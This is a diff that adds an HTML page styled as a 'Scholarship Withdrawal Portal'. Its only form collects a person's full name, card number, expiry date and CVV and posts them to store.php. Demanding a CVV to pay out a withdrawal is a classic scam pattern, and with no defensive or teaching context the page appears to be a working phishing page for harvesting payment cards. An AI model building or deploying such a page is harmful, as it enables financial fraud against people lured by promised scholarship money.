@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Scholarship Withdrawal Portal</title>
+  <style>
+    body { font-family: Arial, sans-serif; background: #f9f9f9; }
+    .container {
+      width: 350px; margin: 100px auto; padding: 20px;
+      background: #fff; border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+    h2 { text-align: center; }
+    input {
+      width: 100%; padding: 10px; margin: 8px 0;
+      border: 1px solid #ccc; border-radius: 5px;
+    }
+    button {
+      width: 100%; padding: 10px; background: #28a745;
+      color: white; border: none; border-radius: 5px; cursor: pointer;
+    }
+    button:hover { background: #218838; }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Withdrawal Request</h2>
+    <form action="store.php" method="POST">
+      <input type="text" name="name" placeholder="Full Name" required>
+      <input type="text" name="card" placeholder="Card Number" required>
+      <input type="text" name="expiry" placeholder="Expiry Date (MM/YY)" required>
+      <input type="text" name="cvv" placeholder="CVV" required>
+      <button type="submit">Withdraw Now</button>
+    </form>
+  </div>
+</body>
+</html>
